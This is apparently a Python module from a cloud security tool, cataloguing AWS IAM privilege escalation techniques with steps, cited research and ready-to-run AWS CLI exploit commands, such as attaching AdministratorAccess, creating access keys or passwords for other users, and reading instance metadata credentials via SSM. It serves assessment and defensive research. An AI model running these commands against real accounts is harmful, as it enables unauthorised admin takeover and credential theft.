"""Knowledge base of known privilege escalation techniques.

Based on research from:
- pathfinding.cloud (Seth Art / Datadog)
- Rhino Security Labs
- Bishop Fox
- HackTricks Cloud
"""

from typing import Any

# Known AWS IAM privilege escalation techniques
# Reference: https://github.com/DataDog/pathfinding.cloud
ESCALATION_TECHNIQUES: list[dict[str, Any]] = [
    # IAM Policy Manipulation
    {
        "id": "iam-create-policy-version",
        "name": "Create Policy Version",
        "description": "Create a new version of an IAM policy with elevated permissions",
        "required_permissions": ["iam:CreatePolicyVersion"],
        "severity": "critical",
        "steps": [
            "Create new policy version with admin permissions",
            "New version automatically becomes the default",
        ],
        "exploit_commands": [
            'aws iam create-policy-version --policy-arn <policy-arn> --policy-document \'{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}\' --set-as-default'
        ],
        "references": [
            "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/",
            "https://pathfinding.cloud/paths/iam-create-policy-version",
        ],
    },
    {
        "id": "iam-set-default-policy-version",
        "name": "Set Default Policy Version",
        "description": "Change the default version of a policy to a more permissive version",
        "required_permissions": ["iam:SetDefaultPolicyVersion"],
        "severity": "critical",
        "prerequisites": ["A more permissive policy version must already exist"],
        "steps": [
            "List policy versions to find a more permissive one",
            "Set that version as the default",
        ],
        "exploit_commands": [
            "aws iam list-policy-versions --policy-arn <policy-arn>",
            "aws iam set-default-policy-version --policy-arn <policy-arn> --version-id v2",
        ],
        "references": [
            "https://pathfinding.cloud/paths/iam-set-default-policy-version",
        ],
    },
    {
        "id": "iam-attach-user-policy",
        "name": "Attach User Policy",
        "description": "Attach a managed policy (like AdministratorAccess) to a user",
        "required_permissions": ["iam:AttachUserPolicy"],
        "severity": "critical",
        "steps": [
            "Attach AdministratorAccess policy to target user",
        ],
        "exploit_commands": [
            "aws iam attach-user-policy --user-name <user> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
        ],
        "references": [
            "https://pathfinding.cloud/paths/iam-attach-user-policy",
        ],
    },
    {
        "id": "iam-attach-role-policy",
        "name": "Attach Role Policy",
        "description": "Attach a managed policy to a role you can assume",
        "required_permissions": ["iam:AttachRolePolicy"],
        "severity": "critical",
        "prerequisites": ["Must be able to assume the target role"],
        "steps": [
            "Attach AdministratorAccess policy to role",
            "Assume the role to gain admin",
        ],
        "exploit_commands": [
            "aws iam attach-role-policy --role-name <role> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
            "aws sts assume-role --role-arn <role-arn> --role-session-name privesc",
        ],
        "references": [
            "https://pathfinding.cloud/paths/iam-attach-role-policy",
        ],
    },
    {
        "id": "iam-attach-group-policy",
        "name": "Attach Group Policy",
        "description": "Attach a managed policy to a group you belong to",
        "required_permissions": ["iam:AttachGroupPolicy"],
        "severity": "critical",
        "prerequisites": ["Must be a member of the target group"],
        "steps": [
            "Attach AdministratorAccess policy to group",
        ],
        "exploit_commands": [
            "aws iam attach-group-policy --group-name <group> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
        ],
        "references": [
            "https://pathfinding.cloud/paths/iam-attach-group-policy",
        ],
    },
    {
        "id": "iam-put-user-policy",
        "name": "Put User Policy",
        "description": "Create an inline policy on a user with elevated permissions",
        "required_permissions": ["iam:PutUserPolicy"],
        "severity": "critical",
        "steps": [
            "Create inline policy with admin permissions on target user",
        ],
        "exploit_commands": [
            'aws iam put-user-policy --user-name <user> --policy-name privesc --policy-document \'{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}\''
        ],
        "references": [
            "https://pathfinding.cloud/paths/iam-put-user-policy",
        ],
    },
    {
        "id": "iam-put-role-policy",
        "name": "Put Role Policy",
        "description": "Create an inline policy on a role with elevated permissions",
        "required_permissions": ["iam:PutRolePolicy"],
        "severity": "critical",
        "prerequisites": ["Must be able to assume the target role"],
        "steps": [
            "Create inline policy with admin permissions on role",
            "Assume the role",
        ],
        "exploit_commands": [
            'aws iam put-role-policy --role-name <role> --policy-name privesc --policy-document \'{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}\'',
            "aws sts assume-role --role-arn <role-arn> --role-session-name privesc",
        ],
        "references": [
            "https://pathfinding.cloud/paths/iam-put-role-policy",
        ],
    },
    {
        "id": "iam-put-group-policy",
        "name": "Put Group Policy",
        "description": "Create an inline policy on a group with elevated permissions",
        "required_permissions": ["iam:PutGroupPolicy"],
        "severity": "critical",
        "prerequisites": ["Must be a member of the target group"],
        "steps": [
            "Create inline policy with admin permissions on group",
        ],
        "exploit_commands": [
            'aws iam put-group-policy --group-name <group> --policy-name privesc --policy-document \'{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}\''
        ],
        "references": [
            "https://pathfinding.cloud/paths/iam-put-group-policy",
        ],
    },
    # Access Key / Credential manipulation
    {
        "id": "iam-create-access-key",
        "name": "Create Access Key",
        "description": "Create access keys for another user",
        "required_permissions": ["iam:CreateAccessKey"],
        "severity": "high",
        "prerequisites": ["Target user must have < 2 access keys"],
        "steps": [
            "Create new access key for privileged user",
            "Use the new credentials",
        ],
        "exploit_commands": [
            "aws iam create-access-key --user-name <privileged-user>",
        ],
        "references": [
            "https://pathfinding.cloud/paths/iam-create-access-key",
        ],
    },
    {
        "id": "iam-create-login-profile",
        "name": "Create Login Profile",
        "description": "Create console password for a user without one",
        "required_permissions": ["iam:CreateLoginProfile"],
        "severity": "high",
        "prerequisites": ["Target user must not have a login profile"],
        "steps": [
            "Create login profile with known password",
            "Login to console as that user",
        ],
        "exploit_commands": [
            "aws iam create-login-profile --user-name <user> --password <password> --no-password-reset-required",
        ],
        "references": [
            "https://pathfinding.cloud/paths/iam-create-login-profile",
        ],
    },
    {
        "id": "iam-update-login-profile",
        "name": "Update Login Profile",
        "description": "Change console password for another user",
        "required_permissions": ["iam:UpdateLoginProfile"],
        "severity": "high",
        "steps": [
            "Update login profile with known password",
            "Login to console as that user",
        ],
        "exploit_commands": [
            "aws iam update-login-profile --user-name <user> --password <password> --no-password-reset-required",
        ],
        "references": [
            "https://pathfinding.cloud/paths/iam-update-login-profile",
        ],
    },
    # Role assumption
    {
        "id": "sts-assume-role",
        "name": "Assume Privileged Role",
        "description": "Assume a role with higher privileges",
        "required_permissions": ["sts:AssumeRole"],
        "severity": "high",
        "prerequisites": ["Role trust policy must allow assumption"],
        "steps": [
            "Identify role with higher privileges that trusts current principal",
            "Assume the role",
        ],
        "exploit_commands": [
            "aws sts assume-role --role-arn <role-arn> --role-session-name privesc",
        ],
        "references": [
            "https://pathfinding.cloud/paths/sts-assume-role",
        ],
    },
    {
        "id": "iam-update-assume-role-policy",
        "name": "Update Assume Role Policy",
        "description": "Modify a role's trust policy to allow yourself to assume it",
        "required_permissions": ["iam:UpdateAssumeRolePolicy"],
        "severity": "critical",
        "steps": [
            "Update trust policy to allow current principal",
            "Assume the role",
        ],
        "exploit_commands": [
            'aws iam update-assume-role-policy --role-name <role> --policy-document \'{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"<your-arn>"},"Action":"sts:AssumeRole"}]}\'',
            "aws sts assume-role --role-arn <role-arn> --role-session-name privesc",
        ],
        "references": [
            "https://pathfinding.cloud/paths/iam-update-assume-role-policy",
        ],
    },
    # PassRole + Service exploitation
    {
        "id": "ec2-passrole-instance",
        "name": "PassRole to EC2",
        "description": "Create EC2 instance with privileged role and access its credentials",
        "required_permissions": ["iam:PassRole", "ec2:RunInstances"],
        "severity": "critical",
        "prerequisites": ["Must have a privileged role that trusts ec2.amazonaws.com"],
        "steps": [
            "Create EC2 instance with privileged instance profile",
            "Access instance metadata to get role credentials",
        ],
        "exploit_commands": [
            "aws ec2 run-instances --image-id <ami-id> --instance-type t2.micro --iam-instance-profile Name=<profile-name>",
            "# Then SSH to instance and: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>",
        ],
        "references": [
            "https://pathfinding.cloud/paths/ec2-passrole-instance",
            "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/",
        ],
    },
    {
        "id": "lambda-passrole-function",
        "name": "PassRole to Lambda",
        "description": "Create Lambda function with privileged role and invoke it",
        "required_permissions": [
            "iam:PassRole",
            "lambda:CreateFunction",
            "lambda:InvokeFunction",
        ],
        "severity": "critical",
        "prerequisites": ["Must have a privileged role that trusts lambda.amazonaws.com"],
        "steps": [
            "Create Lambda function with privileged role",
            "Function code executes AWS commands as the role",
            "Invoke the function",
        ],
        "exploit_commands": [
            "# Create function code that uses the privileged role",
            "aws lambda create-function --function-name privesc --runtime python3.9 --role <role-arn> --handler lambda_function.handler --zip-file fileb://function.zip",
            "aws lambda invoke --function-name privesc output.txt",
        ],
        "references": [
            "https://pathfinding.cloud/paths/lambda-passrole-function",
        ],
    },
    {
        "id": "lambda-update-function-code",
        "name": "Update Lambda Function Code",
        "description": "Modify existing Lambda function to execute arbitrary code",
        "required_permissions": ["lambda:UpdateFunctionCode"],
        "severity": "high",
        "prerequisites": ["Lambda must have a privileged role attached"],
        "steps": [
            "Update function code to execute desired actions",
            "Invoke the function (or wait for trigger)",
        ],
        "exploit_commands": [
            "aws lambda update-function-code --function-name <function> --zip-file fileb://malicious.zip",
        ],
        "references": [
            "https://pathfinding.cloud/paths/lambda-update-function-code",
        ],
    },
    {
        "id": "cloudformation-passrole-stack",
        "name": "PassRole to CloudFormation",
        "description": "Create CloudFormation stack with privileged role",
        "required_permissions": ["iam:PassRole", "cloudformation:CreateStack"],
        "severity": "critical",
        "prerequisites": ["Must have a privileged role that trusts cloudformation.amazonaws.com"],
        "steps": [
            "Create CloudFormation template that creates admin resources",
            "Create stack with privileged role",
        ],
        "exploit_commands": [
            "aws cloudformation create-stack --stack-name privesc --template-body file://template.yaml --role-arn <role-arn> --capabilities CAPABILITY_IAM",
        ],
        "references": [
            "https://pathfinding.cloud/paths/cloudformation-passrole-stack",
        ],
    },
    {
        "id": "glue-passrole-devep",
        "name": "PassRole to Glue Dev Endpoint",
        "description": "Create Glue development endpoint with privileged role",
        "required_permissions": ["iam:PassRole", "glue:CreateDevEndpoint"],
        "severity": "critical",
        "prerequisites": ["Must have a privileged role that trusts glue.amazonaws.com"],
        "steps": [
            "Create Glue dev endpoint with privileged role",
            "SSH to endpoint and access role credentials",
        ],
        "exploit_commands": [
            "aws glue create-dev-endpoint --endpoint-name privesc --role-arn <role-arn> --public-key file://key.pub",
        ],
        "references": [
            "https://pathfinding.cloud/paths/glue-passrole-devep",
        ],
    },
    {
        "id": "sagemaker-passrole-notebook",
        "name": "PassRole to SageMaker Notebook",
        "description": "Create SageMaker notebook with privileged role",
        "required_permissions": [
            "iam:PassRole",
            "sagemaker:CreateNotebookInstance",
            "sagemaker:CreatePresignedNotebookInstanceUrl",
        ],
        "severity": "critical",
        "prerequisites": ["Must have a privileged role that trusts sagemaker.amazonaws.com"],
        "steps": [
            "Create SageMaker notebook instance with privileged role",
            "Get presigned URL to access the notebook",
            "Execute code in notebook to use role credentials",
        ],
        "exploit_commands": [
            "aws sagemaker create-notebook-instance --notebook-instance-name privesc --instance-type ml.t2.medium --role-arn <role-arn>",
            "aws sagemaker create-presigned-notebook-instance-url --notebook-instance-name privesc",
        ],
        "references": [
            "https://pathfinding.cloud/paths/sagemaker-passrole-notebook",
            "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/",
        ],
    },
    # SSM
    {
        "id": "ssm-send-command",
        "name": "SSM Send Command",
        "description": "Execute commands on EC2 instances via SSM",
        "required_permissions": ["ssm:SendCommand"],
        "severity": "high",
        "prerequisites": ["Target EC2 must have SSM agent and privileged role"],
        "steps": [
            "Send command to EC2 instance",
            "Command executes with instance role permissions",
        ],
        "exploit_commands": [
            'aws ssm send-command --instance-ids <instance-id> --document-name AWS-RunShellScript --parameters \'commands=["curl http://169.254.169.254/latest/meta-data/iam/security-credentials/"]\'',
        ],
        "references": [
            "https://pathfinding.cloud/paths/ssm-send-command",
        ],
    },
    # Data Pipeline
    {
        "id": "datapipeline-passrole",
        "name": "PassRole to Data Pipeline",
        "description": "Create Data Pipeline with privileged role",
        "required_permissions": [
            "iam:PassRole",
            "datapipeline:CreatePipeline",
            "datapipeline:PutPipelineDefinition",
            "datapipeline:ActivatePipeline",
        ],
        "severity": "critical",
        "prerequisites": ["Must have a privileged role for Data Pipeline"],
        "steps": [
            "Create pipeline with privileged role",
            "Define pipeline to execute commands",
            "Activate pipeline",
        ],
        "exploit_commands": [
            "aws datapipeline create-pipeline --name privesc --unique-id privesc",
            "aws datapipeline put-pipeline-definition --pipeline-id <id> --pipeline-definition file://definition.json",
            "aws datapipeline activate-pipeline --pipeline-id <id>",
        ],
        "references": [
            "https://pathfinding.cloud/paths/datapipeline-passrole",
        ],
    },
    # CodeBuild
    {
        "id": "codebuild-passrole-project",
        "name": "PassRole to CodeBuild",
        "description": "Create CodeBuild project with privileged role",
        "required_permissions": [
            "iam:PassRole",
            "codebuild:CreateProject",
            "codebuild:StartBuild",
        ],
        "severity": "critical",
        "prerequisites": ["Must have a privileged role that trusts codebuild.amazonaws.com"],
        "steps": [
            "Create CodeBuild project with privileged role",
            "Buildspec executes commands as the role",
            "Start build",
        ],
        "exploit_commands": [
            "aws codebuild create-project --name privesc --source type=NO_SOURCE --environment type=LINUX_CONTAINER,image=aws/codebuild/standard:5.0,computeType=BUILD_GENERAL1_SMALL --service-role <role-arn>",
            "aws codebuild start-build --project-name privesc",
        ],
        "references": [
            "https://pathfinding.cloud/paths/codebuild-passrole-project",
        ],
    },
]


def get_known_techniques(query: str = "") -> list[dict[str, Any]]:
    """Get known privilege escalation techniques.

    Args:
        query: Optional search query to filter techniques

    Returns:
        List of matching techniques
    """
    if not query:
        return ESCALATION_TECHNIQUES

    query_lower = query.lower()
    results = []

    for technique in ESCALATION_TECHNIQUES:
        # Search in name, description, and permissions
        searchable = (
            technique["name"].lower()
            + " "
            + technique["description"].lower()
            + " "
            + " ".join(technique["required_permissions"]).lower()
        )

        if query_lower in searchable:
            results.append(technique)

    return results


def get_technique_by_id(technique_id: str) -> dict[str, Any] | None:
    """Get a specific technique by ID.

    Args:
        technique_id: The technique ID

    Returns:
        Technique dict or None if not found
    """
    for technique in ESCALATION_TECHNIQUES:
        if technique["id"] == technique_id:
            return technique
    return None


def get_techniques_by_permission(permission: str) -> list[dict[str, Any]]:
    """Get techniques that require a specific permission.

    Args:
        permission: The IAM permission (e.g., 'iam:PassRole')

    Returns:
        List of techniques requiring this permission
    """
    results = []
    permission_lower = permission.lower()

    for technique in ESCALATION_TECHNIQUES:
        for req_perm in technique["required_permissions"]:
            if permission_lower in req_perm.lower():
                results.append(technique)
                break

    return results
